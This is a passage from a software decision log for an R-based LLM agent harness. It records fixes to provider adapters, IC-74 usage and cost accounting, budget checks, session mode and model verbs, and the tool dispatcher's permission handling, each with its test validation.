   constructor zero when the model had no `prices`), a declared zero rate (a local Ollama model)
   a known zero; a price table `usage_cost()` refuses gives an unknown cost. On the `plan-cli`
   route P20 must still set the cost from the CLI's reported `total_cost_usd` (D-015 point 3).
3. **Contract-typed stop reasons and error types.** A non-string Anthropic `stop_reason` or error
   `type` is mapped to `error`/`provider` (R's `switch()` would have picked an alternative by
   position: `2` became `stop`, `5` became `auth`), and `raw_stop_reason` is stored as text
   (04 section 4.2: chr(1)).
4. **push() after a refused retry.** When the transport's `retry(info)` refuses at once and calls
   `fail()` from inside it, `push()` returns `TRUE` (the terminal event was emitted, 04 section
   8.1); the plan returned `FALSE`.
5. **The 5-minute/1-hour cache split survives `message_delta`.** The current wire shape repeats
   the cumulative `cache_creation_input_tokens` in `message_delta` without a `cache_creation`
   object (report 07 section 3.14). The plan treated that bare total as a new split (every write
   5-minute, `cache_write_1h = 0`), so 1-hour writes (gptr's BP1/BP2 default) were priced at the
   5-minute rate. A bare total now updates the split (`anthropic_cache_total()`): a split that
   adds up to it is kept, otherwise the known 1-hour writes are kept and the rest are 5-minute
   writes; only when no split was ever reported is every write a 5-minute write (report 07
   section 3.5). `usage.iterations` is not used (its relation to the top-level totals is not
   verified).

Validation: `progress/P12.md`, Task 1 (`test-provider-anthropic.R`; the four regression tests
failed 9 assertions against the plan-literal source; the two review-round regression tests for
points 1 and 5 failed 7 assertions before the fix).

## D-023 - P12 request headers from the resolved provider record, merged by name; no thinking without budget room (2026-10-03)

Four changes to P12 Task 2's plan-literal request builder (`R/provider-anthropic.R`):

1. **`adp_provider_headers(model, opts = NULL)`.** The plan's helper took only `model` and looked
   the provider up again with the global `provider_get()`. That lookup never sees a session-scoped
   (rank 0) record, such as a provider passed as `model = <spec>` (04 section 10.1). Such a
   provider's non-secret `headers` (04 section 10.2 row 1) were dropped. When a session record
   shadowed a global one with the same id, the request mixed the session record's base URL and
   credential with the global record's headers. The helper now uses the record that
   `provider_stream()` resolved and passed as `opts$provider` (session first, settings applied;
   P05 ambiguity 13). It accepts that record when the model's provider is its id, name or one of
   its aliases. Otherwise it uses the session's own record (`opts$session`, with the settings
   applied), and only then the global `provider_get()`. The argument is optional, so the plan's
   one-argument calls still work. Tasks 5, 7 and 9 must call `adp_provider_headers(model, opts)`
   so the defect does not spread to their adapters.
2. **A budget model with no room for the minimum budget sends no thinking.** The plan's clamp
   `min(budget, max(1024, max_tokens - 1024))` gave `budget_tokens = max_tokens` when the model's
   `max_output` (or the requested `max_tokens`) left `max_tokens <= 1024`. The API needs
   `1024 <= budget_tokens < max_tokens` (report 07 section 2.6, and the plan's own body rule "a
   budget below `max_tokens`"). In that case the body now carries no `thinking` and no
   interleaved-thinking beta, and `max_tokens` stays at the requested value (capped by
   `max_output`) instead of the raised one. Any `max_tokens` above 1024 keeps budget thinking,
   with the plan's clamp. No current catalog model is affected (Haiku 4.5 has `max_output`
   64000).
3. **Provider headers are merged, not appended: `adp_merge_headers(base, extra, lists, auth)`.**
   The plan's `headers = c(headers, adp_provider_headers(model))` repeats a name when the record
   (or `providers.<id>.headers` in settings) sets one the adapter also sets, and P04's
   `http_headers()` refuses a spec with a repeated name (in any case), so the request never left
   the process. An `anthropic-beta` header in the record broke only requests where gptr adds its
   own beta (an OAuth token, budget thinking, inline tool additions), so it could fail mid-session.
   The helper compares names case-insensitively. The adapter's headers win: a record header with
   the name of one the adapter set is dropped, so a record never changes the wire format
   (`content-type`, `accept`, the API version) or replaces the credential. This differs from Pi,
   where caller headers replace defaults, because gptr's parser and credential handling depend on
   them. Two exceptions. A header named in `lists` (for Anthropic `anthropic-beta`) gets the
   tokens of both sides, the adapter's first, each once. While the adapter sends a credential, a
   record header named in `auth` (for Anthropic `x-api-key` and `authorization`) is dropped, so
   two credentials are never sent (plan Global Constraints: "never sends both"). Without a
   credential, such a record header is sent as it is. Of two record headers with the same name,
   the last is kept. Tasks 5, 7 and 9 must call
   `adp_merge_headers(headers, adp_provider_headers(model, opts), auth = <their credential
   header names>)` instead of the plan's `c()`: Chat Completions `c("authorization", "api-key")`,
   Responses `"authorization"`, Gemini `"x-goog-api-key"`.
4. **An image-only tool result for a model without image input carries only the omission note.**
   The plan's `anthropic_tool_result()` led every result without text with "(see attached
   image)", also when each image had been replaced by the note "(image omitted: this model does
   not accept images)", so the model got two contradicting notes. The lead is now added only when
   an image block is attached. P05's `handoff_transform()` usually strips images for text-only
   targets first, so this mainly concerns direct `build()` callers.

Validation: `progress/P12.md`, Task 2 review rounds 1 and 2. The round-1 regression tests failed 7
assertions against the plan-literal source; the round-2 tests failed 6 (4 header, 2 image note).

## D-024 - IC-74 usage roll-up: request ids are required, an unknown cache read stays unknown (2026-10-03)

P06 Task 4's literal `usage_add()` and `ledger_mark_cached()` predate IC-74 (07-local-ollama.md
section 5: "Missing usage remains unknown"). Two behaviours changed, which Tasks 10, 11 and 13,
P18's tests and P19's roll-up consume:

1. **Every usage row needs its request id.** `usage_add(s, row)` refuses a row whose
   `request_id` is `NA` with `gptr_error_invalid_argument` (`arg = "row$request_id"`) before any
   session changes. `session_usage_rows()` de-duplicates by request id (a request recorded twice
   counts once), so distinct rows without an id would have collapsed into one and understated the
   totals. P05's `usage_row()` always sets an id (it generates one when the message has none) and
   every planned caller passes one.
2. **An unknown cache read leaves the ledger's cache flags unknown.**
   `ledger_mark_cached(s, request_id, cache_read)` with `cache_read = NA` (a reported usage whose
   cache read is unknown) sets that request's `cached` flags to `NA`; the plan left them `FALSE`, a
   claim that nothing was cached. A fully unreported usage (D-022) is first replaced by Task 10's
   estimate, whose `cache_read` is 0, so it never reaches the ledger as `NA`. A known zero still leaves them `FALSE`, and a positive read marks the
   leading components as planned.

The session footer follows D-021: an unknown token count or cost prints as `unknown tokens` /
`unknown cost` (new `format_cost()`), never `$NA` or zero, and `s$cost` is `NA` when any request's
cost is unknown.

Validation: `progress/P06.md`, Task 4 (`test-session-budget.R`, `test-session-object.R`; the added
tests failed 8 assertions against the plan-literal code).

## D-025 - IC-74 budgets compare the known usage; an unknown cost cannot reach a budget (2026-10-04)

P06 Task 5's literal `run_used()`, `budget_check()` and `budget_near()` predate IC-74
(07-local-ollama.md section 5: "Missing usage remains unknown"). Since D-015, D-021 and D-022 a
request of an unpriced model has cost `NA`, and a reported usage can carry an unknown column (for
example the cache read). The plan summed each row with `+` and `sum()`, so one unknown value made
the run's total `NA`, and `if (... used$cost >= lim$cost)` then stopped the engine with base R's
unclassed "missing value where TRUE/FALSE needed" before every later request of the call. The
behaviour now, which Task 10 (`run_request()`, `run_response()`, `run_budget_extend()`,
`run_stop_budget()`), P19's shared pools and P20's `--max-budget-usd` consume:

1. **Budgets compare the known part of the usage.** `run_used(run)` sums each token column and
   the cost on its own with `na.rm = TRUE`. An unknown value adds nothing known, so it can never
   reach a limit, and a row's known input and output still count when its cache read is unknown.
   `turns` counts every request, known or not. The `used` that `budget_check()` returns and that
   `budget_near` (and Task 10's `budget_exceeded` and `gptr.budget`) carries is therefore a lower
   bound when a request's usage is unknown. It is never a claim that the unknown part was zero:
   the session's own totals stay `NA` (D-021, D-024).
2. **Consequence: the cost budget cannot be enforced for unpriced requests.** A call on a model
   without price evidence is still capped by the token budget (default 2,000,000 tokens per
   top-level call, IC-66), which Task 10 always feeds with known or estimated tokens (D-024 item 2).
   Treating an unknown cost as reaching the cost budget (fail closed) was considered and rejected:
   with the default 5 USD budget every unpriced cloud model would stop with status `budget` after
   its first request, unless the user disabled the cost budget. A maintainer who prefers the
   fail-closed reading changes only `run_used()`/`budget_check()`.
3. **`budget_check(s, estimate)` refuses an estimate that is not one nonnegative number**
   (`gptr_error_invalid_argument`, `arg = "estimate"`) instead of propagating `NA` into the
   comparison. Task 10 passes `req$tokens_est %||% 0`.

Validation: `progress/P06.md`, Task 5 (`test-session-budget.R`; the three added blocks failed 4
times against the plan-literal source: three unclassed `if (NA)` errors and an `NA` token total).

## D-026 - P12 conformance: no normaliser error, warning or message escapes, http_json goldens are not cases; classifier coverage open (2026-10-04)

P12 Task 3's plan-literal `check_adapter()` (the `check.adapter` service behind `gptr_check()`
for adapter specs, `R/provider-anthropic.R`) was changed in three ways. P02's `gptr_check()` and
P24 consume it.

1. **A warning or message from a normaliser fails the case.** 04 section 8.1 says "Normalisers
   never signal R conditions after `start`". The plan's replay caught only errors. A normaliser
   that warned therefore passed the check, and its warnings reached the caller of
   `check_adapter()` and `gptr_check()`. The new `adp_check_replay()` wraps `adp_replay()` in
   exiting `warning` and `message` handlers (`tryCatch()`), and `check_adapter()` uses it for the
   whole and the chunked replays. The first such condition ends that replay and becomes its
   condition, as an error already did:
   - a condition in the whole replay fails `adapter.<case>.no_condition`, and the case's other
     rows (`.event_order`, the goldens, `.chunk_invariance`, `.roundtrip`) are not produced;
   - a condition that appears only in a chunked replay fails `.chunk_invariance`.

   The handlers exit rather than muffle. A warning or message raised with `signalCondition()`
   has no muffle restart: `invokeRestart("muffleWarning")` then threw "no 'restart'
   'muffleWarning' found" out of `check_adapter()`, and `tryInvokeRestart()` would let the
   condition go on to the caller's own calling handlers. With exiting handlers, nothing reaches
   the caller in either case. `adp_replay()` is unchanged.
2. **`http_json` fixtures exclude the golden files.** The plan selected `\.json$` files, which
   also match `<case>.events.json`, `<case>.message.json` and `model.json`. For an `http_json`
   adapter with a stream `parse`, those three were then replayed as extra cases. They are now
   excluded. No P12 adapter uses `http_json`, so the four built-in results are unchanged.
3. **Diagnostics and arguments.**
   - If `build()` fails, the `adapter.tool_choice` row names the error. The plan reported every
     failure as "a list tool_choice was sent".
   - The `adapter.replay` row keeps `ok = TRUE` and carries the note "nothing to replay: no
     stream normaliser (inprocess or classifier adapter)".
   - `adapter` must be a list and `fixtures` `NULL` or one string, else
     `gptr_error_invalid_argument`.

**Open point (IC-74, not resolved).** The P12 row of 07-local-ollama.md section 6 says
"classifier adapters receive conformance coverage". As in the plan (its ambiguity 15), Task 3
returns only `adapter.replay` for a classifier adapter (`classify` without a stream `parse`). It
does not replay classifier wire fixtures through
`classify$parse(model, status, headers, body, questions)` or `run()`, and does not validate the
canonical `noul`/`choice`/`score` records of 07 section 3. Two things are missing:
- a classifier fixture layout, which no spec defines;
- the canonical-answer validator, which P13 owns (`s1_dispatch()`, `R/s1-ollama.R`,
  `fixtures/jev/`).

The coordinator or maintainer must decide whether that coverage belongs in `check_adapter()` once
P13 provides these, or in P13's own conformance tests. Until it has an owner, P12's plan
acceptance should carry this point as open rather than record IC-74's P12 row as met.

Validation: `progress/P12.md`, Task 3. The three added tests failed 7 + 1 + 1 assertions against
the plan-literal source (269 escaped test warnings in the first run). The `signalCondition()`
assertions of review round 1 failed 3 times against the muffling handlers, and 4 times with 216
escaped test warnings against a `tryInvokeRestart()` variant.

## D-027 - P12 Chat Completions normaliser: IC-74 usage, compat from the resolved provider record, typed finish reasons, merged reasoning_details (2026-10-04)

P12 Task 4's plan-literal `completions_normaliser()` (`R/provider-openai-completions.R`, the
`parse` of the `openai-completions` adapter that also serves Ollama chat models, IC-74) was
changed in the six ways below, and two shared helpers in `R/provider-anthropic.R` changed with
it. Task 5 (`completions_build()`), P06's usage rows and P24 consume them.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-022). The
   plan read every usage field with `%||% 0`, so a reported null became a known zero.
   `completions_usage()` now follows D-022's rule. A field the provider left out of a reported
   usage keeps P05's legacy zero. A reported null, or a value that is not a nonnegative number,
   is `NA`. The first known of `prompt_tokens_details.cached_tokens`, `prompt_cache_hit_tokens`
   (DeepSeek) and `cached_tokens` (Kimi) is the cache read, as Pi's `??` chain does, so a null
   `cached_tokens` falls back to the next field; when only nulls were reported the cache read,
   and with it the input, is `NA`. `"usage": null` (OpenAI sends it on every chunk but the last)
   is no report. A stream that reported no usage at all keeps the core's unknown usage (D-022
   point 1): the plan's goldens for `error_chunk` and `truncated` wrote zeros.
2. **Unknown usage in the goldens is JSON null.** The hand-written goldens of those two cases
   record every count as `null` (new `g_usage_unknown()` in `make_fixtures.R`), and
   `adp_golden_message()` projects an `NA` count to `NULL`, the representation the session file
   already uses (`usage_to_json()`). Before this, an `NA` reached `json_encode()` as the string
   `"NA"`. The Anthropic goldens hold no unknown count and are unchanged. Tasks 6 and 8 must write
   `usage = g_usage_unknown()` for a failed or truncated fixture that reports no usage.
3. **The compat record comes from the resolved provider record** (D-023 item 1, extended). The
   plan's `compat_flags(model$provider, model)` looked the provider up globally, so a
   session-scoped provider (`model = <spec>`, 04 section 10.1) lost its `compat`
   (`supports_finish_reason`, `think_tags`, ...), and a session record that shadows a global one
   got the global record's flags. D-023's lookup moved into the shared helper
   `adp_provider_record(model, opts)` (`adp_provider_headers()` now calls it, with unchanged
   behaviour), and the normaliser calls `compat_flags(adp_provider_record(model, opts) %||%
   list(id = <provider id>), model)`. Tasks 5 and 7 must do the same in `build()` instead of the
   plan's `compat_flags(model$provider, model)`.
4. **Contract-typed finish reasons** (04 section 4.2; D-022 point 3). `completions_stop()` maps a
   `finish_reason` that is not one string to `error`; R's `switch()` mapped a number by position
   (`2` became `stop`). `raw_stop_reason` is stored as text.
5. **Robustness without a contract change.** Chunk fields are read with `[[` (no `$` partial
   matching). An `error` given as a bare string is its message. Tool arguments sent as a parsed
   object are serialised back to JSON text instead of being joined as R values. A Mistral
   `thinking` item given as a bare string is thinking text. Each of these previously ended the
   stream with an `internal` error through `adp_guard()` or corrupted the arguments.
6. **OpenRouter `reasoning_details` are merged and accumulated linearly** (04 section 8.1;
   report 09 section 2.3, Pi `openai-completions.ts:665-676`; review round 1). The plan grew the
   list with `c(cur$details, d$reasoning_details)` on every chunk and kept every per-delta
   fragment, so the opaque block, which the session file keeps and Task 5 replays verbatim as
   `reasoning_details`, held one item per delta (20,000 deltas: 20,000 items, 2.0 MB, 3.7 s
   against 0.9 s without details). The new `completions_details()` collects items in the core's
   linear buffer and merges consecutive `reasoning.text` or `reasoning.summary` fragments of the
   same type and `index` (and no conflicting `id`) as Pi does: the text is joined once, and a
   later non-null field such as the closing `signature` is kept. `reasoning.encrypted` and other
   items stay discrete and verbatim; a null item is dropped. Same 20,000 deltas: one item, 129 KB,
   1.4 s. Task 5's `completions_assistant()` replays the merged array unchanged.

Validation: `progress/P12.md`, Task 4. Against the plan-literal source the added tests and the
adapted goldens failed 10 assertions (2 golden messages with `"NA"`, 2 null usages read as zero,
3 for the numeric finish reason, 3 for the session-scoped compat); the point 5 test failed 5 more
(an `internal` error with "$ operator is invalid for atomic vectors" for the string error, empty
object arguments, and an `internal` error for the bare thinking string). Point 6 failed 2
assertions against the per-fragment list (the merged opaque JSON in two streams).

## D-028 - P06 session verbs: no chat on decision models, enqueue checks attachments and model code, mode changes keep the run's invariants (2026-10-04)

P06 Task 6's plan-literal `session_set_model()`, `session_set_mode()`, `mode_block_text()` and
`session_enqueue()` (`R/session-object.R`) were changed in six ways. P08 (`gptr_steer()`, the mode
and model verbs), P11 (the plan execute menu), P14 (the pause menu and the pipe), P15 and P19
(sub-agent reports) and Task 15's `ctx.kernel` consume them.

1. **Decision-only models are refused for chat** (IC-74, 07-local-ollama.md sections 1 and 6:
   "expected failures for chat on decision-only models"). `session_set_model()` resolves `ref`
   purely (no discovery, no I/O) and refuses a model of `type = "classifier"` (the fake
   classifier, `ollama/clef-flash`, `typesafe/jev-latest` and the alias `jev`) before anything is
   appended or emitted, with `provider_stream()`'s refusal (`stream_chat_model()`, D-017 item 3):
   `gptr_error_not_available`, `member` = the resolved ref, `provided_by = "a conversational
   model"`. `model_canonical()` now also returns the resolved `type` (`NULL` for a router or an
   unresolved reference). The plan accepted the switch, so the refusal came only at the next
   request. `session_new()` stays lenient (Task 3); there, `provider_stream()` still refuses at
   the first request.
2. **Attachments are checked before the item enters the queue** (04 section 4.2, IC-55; the steering
   rule of `progress/P06-loop.md`). The loop takes items off the queue destructively and only then
   calls `queue_item_message()`, which refuses a non-text block on a steering relay; the plan
   accepted any list as `blocks`, so such a steer was lost at delivery. `queue_blocks_check()`
   requires an unnamed list of complete user content blocks (`text`, `image` or `context` with
   their string fields) and, for a steer from a user source (`pipe`, `pause_menu`, `repl`,
   `api_user`), text blocks only; otherwise `gptr_error_invalid_argument` with `arg = "blocks"` and
   nothing is queued or emitted. A user steer is refused even on an idle session, because whether
   it is delivered as a relay depends on when a run takes it. Follow-ups, extension notes and agent
   reports keep their user-role shapes; operator relays stay text-only.
3. **The attachments are redacted with the `context` profile at ingress**, as the text is (03
   section 6.5: `context` is egress to providers; image data and replay signatures are left alone
   by `redact_tree()`). The plan redacted only the text.
4. **Only a `mode` context block of rank 3 or more supplies the operator note** (IC-52: operator
   authority only from records of rank 3 or more; 04 section 4.2: operator messages carry harness
   facts only). The note is an operator message, but the plan used the winning `mode` block
   whatever its rank, and the lowest rank wins (session 0, project 1). A session or project record
   named `mode` now gives the one-line notice instead; user, plugin and built-in records (P07's
   `builtin:context`, rank 6) are used as planned. `provide()` sees only the session's ctx (no
   rendering input), so P07's `context_provide_mode()` describes the session's mode; a body whose
   `attrs$name` names a mode other than the one the note is for (a nested run whose effective
   mode item 5 tightens) also gives the notice, so a block is never named for one mode while its
   text describes another. A body without `attrs$name` is used as planned.
5. **A mode change keeps the run's invariants** (`mode_apply_run()`). As in `run_new()`, a nested
   run takes the stricter of its outer run's mode and the new one (IC-53 item 4: "only
   tightened"); the plan set `run$mode` to the new mode, loosening a nested run beyond its outer
   run. The run evaluates `r` in a scratch overlay of its home exactly while its mode is `plan`
   (IC-15: the scratch exists "when the effective mode is `plan`"); the plan left the scratch as it
   was at the start, so a mid-run switch into plan mode evaluated in the home and a mid-run switch
   out of it (any `session_set_mode()` while a run is active, for example from a hook or P14's
   console) kept evaluating in the discarded scratch. The operator note is queued only when the run's mode changes, and it
   names the run's effective mode. This supersedes P11 ambiguity 14's parenthetical
   "`session_set_mode()` changes `run$mode` but not the overlay": the overlay now follows the
   effective mode (P11's execute menu runs at `agent_end`, after the plan run, so its design is
   unchanged).
6. **Model code enqueues only the first input of a never-run session, as a follow-up** (IC-55:
   `gptr_steer()` and `ctx$send()` "called from model-evaluated code of the same session tree are
   refused"; "a child agent's text never appears in an operator message"). The plan exempted any
   item while the session had no entries and no live run, so an `r` call could queue a steer with a
   user source on a never-run session of its tree, which its first run then delivered as the
   operator relay "The user sent this message while you were working: ...". The exception now
   covers only what P08 ambiguity 5 needs, the queued prompt of a `.run = FALSE` call: `as =
   "follow_up"`, no entries, no live run and an empty queue. Steers (any source) and later items
   from model code are refused with `gptr_error_permission`.

Validation: `progress/P06.md`, Task 6. Against the plan-literal source the added tests failed 15
times: the switch to the fake classifier was accepted (2); the nested run was loosened, with notes
for an unchanged effective mode, and a non-session `s` gave an unclassed error (5); no scratch
after a switch into plan mode and a stale one after leaving it (3); project- and session-rank
blocks became operator text (2); an image on a user steer was queued (2); a text attachment kept
its key (1). Review round 1 added item 6 and the `attrs$name` rule of item 4: against the round's
source the extended tests gave [ FAIL 4 | PASS 228 ] (a nested run's note read "BODY FOR auto"
under `<mode name="edits">`; a body named `edits` was used for `plan`; a model-code steer to a
never-run session was accepted, which ended that block).

## D-029 - P12 Chat Completions request bodies: tools only where the model calls tools, no tool_choice without tools, image notes, the bridge after tool results, complete memo keys (2026-10-04)

P12 Task 5's plan-literal `completions_build()` and `completions_tool_results()`
(`R/provider-openai-completions.R`, the `build()` of the `openai-completions` adapter that also
serves Ollama chat models, IC-74) were changed in five ways. They also apply D-023 items 1 and 3
and D-027 item 3 as those entries require: the compat record comes from
`adp_provider_record(model, opts)` and the provider headers are merged with
`adp_merge_headers(..., auth = c("authorization", "api-key"))`. P07's `request_build()`, P06's
runs and P24 consume the bodies.

1. **Tools go only to a model that calls tools** (07-local-ollama.md section 1: "General LLM tool
   calling, images, structured output, streaming and reasoning are enabled only when the selected
   model supports them"; IC-74). P05's Ollama preparation sets `tool_call = FALSE` when the server
   reports no `tools` capability, and Ollama answers a request carrying tools for such a model
   with an error. A model whose record says `tool_call = FALSE` now gets no `tools` (not even the
   plan's `tools: []` for a history with tool calls) and no `tool_choice`; the history's tool calls
   and results are still sent.
   **Reach (corrected in review round 1).** The gate reads the model record P05 resolves, and
   `model_resolve()` always sets the field: an omitted `tool_call` becomes `FALSE`
   (`R/catalog-models.R`, `tool_call = isTRUE(e[["tool_call"]])`), and a generic local id
   (`lmstudio/...`, `llamacpp/...`, `vllm/...` without a catalog entry) gets `tool_call = FALSE`.
   Catalog chat entries carry `TRUE`, because P05's catalog drops models without tool calling. So
   every resolved model on `openai-completions` without `tool_call = TRUE` gets no tools: a user or
   plugin `gptr_provider()` model must declare `tool_call = TRUE` in its model list, and a generic
   LM Studio, llama.cpp or vLLM id gets none. Only a raw model record without the field (adapter
   tests, `gptr_check()` fixtures) keeps the plan's behaviour. Downstream owners: P07's
   `request_build()` and the T1 tool catalog should not advertise tools to a model whose
   `tool_call` is `FALSE`, because this adapter drops them without a notice; and P05's FALSE for
   generic local ids now removes tools for those servers (a P05 decision, recorded here, not
   changed). The test "a resolved model whose record omits tool_call gets no tools" pins this with
   `model_resolve()` records.
2. **No `tool_choice` without a tools array.** OpenAI-compatible hosts refuse `tool_choice` when
   no `tools` are given, and a forced choice would name a tool that is not declared. The plan sent
   `tool_choice: "none"` (or a forced choice) whatever the tools were.
3. **Images in tool results for a text-only model** (D-023 item 4 for this adapter). Each image
   becomes the omission note "(image omitted: this model does not accept images)" in the `tool`
   message, after the text; no image message follows. The plan gave an image-only result
   "(see attached image)" with nothing attached and silently dropped images after text.
4. **The bridging assistant message precedes every user message after tool results** for
   `requires_assistant_after_tool_result` (report 09 sections 3.2 and 3.3; Pi 1233-1238,
   1426-1461, 1443-1448). The `returns` instruction counts as a user message: when tool results
   are the last messages and `returns =` is set, the bridge precedes the instruction. When the
   results' images are attached (a model with image input), the bridge precedes the "Attached
   image(s) from tool result:" user message, and no second bridge follows it, as in Pi, where
   `lastRole` becomes `"user"` (review round 1). The plan put the image message directly after the
   tool messages and the bridge after it, so on such a host every request after a tool returned an
   image (an R plot) had a user message right after tool results. Now a user message never
   directly follows tool results on such a host.
5. **Complete memo keys** (04 section 8.1 memo, plan ambiguity 7: keys cover what reaches the
   wire). Message and tool-result pieces are also keyed by the model's image input, its
   `reasoning` flag (DeepSeek's forced `reasoning_content`) and a hash of the compat record. With
   the plan's keys (provider and model id), a changed compat record (for example a provider's
   `compat` changed in settings) or image input within one session served a stale piece. The
   frozen prefix is unchanged while these stay the same.

Validation: `progress/P12.md`, Task 5. Against the plan-literal source the added tests failed 17
assertions (9 for the resolved provider record, 3 for tools and `tool_choice`, 2 image notes, 1
bridging assistant, 2 in the memo test); a mutation that removes only the new memo-key fields
fails the 2 memo assertions. The plan's 12 tests pass unchanged (the default cache-policy test
skips until P07 registers the `default` policy). `gptr_check()` on the adapter: 25 checks, 0 failed.
Review round 1: the image-bridge regression assertions failed against the round's source
([ FAIL 3 | PASS 267 ], one error ended that test); mutations that drop the compat hash or the
`reasoning` flag from the message memo key each fail one new memo assertion; final
`^provider-openai-completions$` [ FAIL 0 | WARN 0 | SKIP 1 | PASS 274 ].

## D-030 - P06 tool dispatcher: never throws on malformed tool, policy, classifier or UI output; interrupted and nested calls stay paired (2026-10-04)

P06 Task 7's plan-literal `R/agent-dispatch.R` (the dispatcher and `perm_check()`, IC-04, IC-53)
was changed in ten ways. Every change makes the code keep a promise of 04 section 7.6
(`dispatch_tools()` "never throws", `perm_check()` fails closed) or of INFRA-10 (paired execution
events) for input the plan did not guard. The plan's tests all pass unchanged. Task 10's engine,
P10/P18/P22/P23 (`dispatch_nested()`), P18/P20 (`perm_check()`, `tool_result_message()`) and
P11 (policies, UI) consume the code.

1. **A risk record without one `level` from 0 to 4 counts as level 3** (`call_risk()`; IC-54 levels;
   the plan's level for a failing classifier). A tool `risk()` or `risk.classify` answer that is
   not a list, has no level, or has a level such as 7 or `NA` made `risk_level()` throw out of the
   dispatcher (`$ operator is invalid for atomic vectors`), or reached policies as is. A numeric
   level is stored as an integer.
2. **The pipeline of one call cannot throw** (`dispatch_one()` wraps the plan's body, now
   `dispatch_steps()`). An unexpected error (a broken invariant, a failing service) becomes the
   error result `Tool <name> failed in the dispatcher: <message>`, so the call still gets its
   tool-result message and `tool_execution_end`. An interrupt is not an error and still unwinds.
3. **A malformed tool result is an error result** (`tool_run()`, `tool_result_check()`, used
   directly and for nested calls). P02's `as_tool_result()` returns a `gptr_tool_result` unchanged,
   so a hand-built result with, for example, `details = "x"` made `msg_tool_result()` throw out of
   `dispatch_tools()`. Content must be text/image blocks with their string fields (P01's
   `msg_block_types`, `msg_block_fields`), `details` `NULL` or a named list, `is_error` and
   `terminate` `NULL` or one logical.
4. **A policy answer that fails P02's rule for policy answers denies** (`perm_policies()`;
   `ext_policy_ok()`, 04 section 10.2 row 12). The plan checked only the decision. A `modify`
   whose `input` is not a named list was re-checked with that input and, when the policies then
   allowed it, the tool ran with a non-list input that had bypassed validation. A `reason` that is
   not one string is also malformed now. `NULL` and a list without `decision` stay "no opinion"
   (plan review row 8).
5. **A UI answer that is not a list is not an approval** (`perm_ask()`; 04 section 10.2 row 22, "a
   failing dialog is not an approval"). `"allow"` or `TRUE` made `ans$decision` throw out of
   `perm_check()`; they now deny with "the user declined". Feedback that is not one non-empty
   string is dropped. The request record's `reason`, `suggested_rule` and `undo_note` are one
   string or `NULL` (04 section 7.11), and every `perm_check()` reason is one string.
6. **A nested call's execution events stay paired, and its id is unique** (`nested_execute()`,
   `nested_next_id()`; INFRA-10, IC-53 item 3). An interrupt inside a nested member left its
   `tool_execution_start` without an end. P02's record of executing tools then kept the call, so
   `gptr_register()`'s unregister closure and the other control exports refused with
   `gptr_error_permission` after the run (observed as teardown errors in the red run). The end is
   now emitted from `on.exit()` before the outer call's end. The plan's id `<outer>/<k>` used the
   number of the 20 kept records, so calls after the 20th all got `<outer>/21`; the count is now
   kept per outer call in `run$nested_seq`.
7. **The frozen schema memo is keyed on the frozen tool array** (`tool_frozen()`, IC-68). The plan
   cached the parsed schemas at the first call, even before the first freeze (an empty table) and
   across a refreeze, so a tool whose `parameters` is a function was then never validated, or was
   validated against a stale schema.
8. **Input fields are matched exactly** (`[[` for `INVALID_JSON`, `code`, `path`, `questions`,
   `question`). `$` matched by prefix, so a tool input `code_path` was shown and classified as `r`
   code, and `INVALID_JSON_note` failed validation. A nested member listed with a non-numeric level
   by the outer analysis passes the gate (`nested_listed_level()`); the plan's `max(NA)` threw an
   unclassed error inside the model's code.
9. **An interrupt anywhere in a call is recorded** (`dispatch_call()`, `tool_interrupted()`;
   INFRA-10, 03 sections 6.2, 6.3 and 6.8.3, loop check L19). The plan recorded an interrupt only
   while the tool's `execute()` ran (`tool_execute_frame()`'s `on.exit()`). Ctrl-C at the permission
   prompt (which aborts the run), or an interrupt in a policy, a classifier, a hook or a
   checkpointer, unwound with no tool-result message and no `tool_execution_end`, so P02's record
   of executing tools kept the call until `agent_end`. Each call now has its own frame whose
   `on.exit()` records the error result and the end event: "Interrupted after <s> s; side effects
   may have occurred." once `execute()` has started, else the new text "Interrupted before the
   tool ran; the call was not executed.". The interrupt is still never handled (no
   `tryCatch(interrupt =)`; G3). A calling `error` handler only notes an error that escapes the
   call (a failing store), which still ends the run and is not recorded a second time; the append
   and its mark run inside `suspendInterrupts()`. The one-shot control tokens end with the call
   even when it ends before `execute()`.
10. **Tool results are normalised, and must be recordable** (`tool_result_check()`,
    `tool_result_message()`, `dispatch_record()`). The names of the content list are dropped: P02's
    `gptr_tool_result()` keeps those of a named `images` list, which item 3's check refused and the
    transcript would write as a JSON object. `usage` must be `NULL` or a list (`msg_tool_result()`
    threw). The tool-result message is encoded as the store encodes it before it is appended, so
    `details` holding an environment or a function (from the tool, or from a `tool_result` hook's
    patch, which P02 accepts as a named list) become the error result "The result of <name> cannot
    be recorded in the transcript: <message>" instead of a store failure that ends the run.

Validation: `progress/P06.md`, Task 7. With the plan-literal source, every added test block fails
(`dev/.validation/P06/task7-added-red-isolated3.log`; the nested-id repetition is shown on its
own in `task7-nested-ids-literal.log`). Items 9 and 10 (review round 1): the four new blocks fail
against the round-0 source (`task7-fix1-red.log`, `task7-fix1-red-isolated.log`).

## D-031 - P12 Responses normaliser: IC-74 usage, typed status and error codes, items found by id (2026-10-04)

P12 Task 6's plan-literal `responses_normaliser()` (`R/provider-openai-responses.R`, the `parse`
of the `openai-responses` adapter) was changed in the four ways below. Task 7 (the request
builder and `builtin:openai`), P06's usage rows and P24 consume it.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-022, D-027).
   The plan read every usage field with `%||% 0`, so a reported null became a known zero.
   `responses_usage()` now follows D-027's rule with Task 4's helpers (`completions_count()`,
   `completions_first()`): a field left out keeps P05's legacy zero, a reported null (or a value
   that is not a nonnegative number) is `NA`, and `"usage": null` is no report. Usage that
   `response.failed` reports is recorded on the error's partial message; the plan dropped it. The
   hand-written goldens of `failed` and `truncated` (no usage on the wire) record unknown usage
   (`g_usage_unknown()`, as D-027 point 2 requires); the plan wrote zeros, which the D-022 core
   no longer produces.
2. **Contract-typed status and codes** (04 sections 2.2, 4.2; D-022 point 3). A `status`,
   `incomplete_details.reason` or error `code` that is not one string is never used as text
   (`responses_str()`): the plan built `raw_stop_reason` `"7.max_output_tokens"` from a numeric
   status, classified `list("server_error")` as a retryable overload and threw on a vector code.
   A terminal response without a `status` takes it from its event (`response.completed` is
   `completed`, so `stop`; the plan gave `error`), as Pi's `mapStopReason()` does.
3. **Every error shape is read** (08 section 3.3). An SSE `event: error` whose data has no `type`,
   and a `data` object with only an `error` member, are error events (the plan ignored them and
   later reported a truncated stream); an error given as a bare string is the provider's message
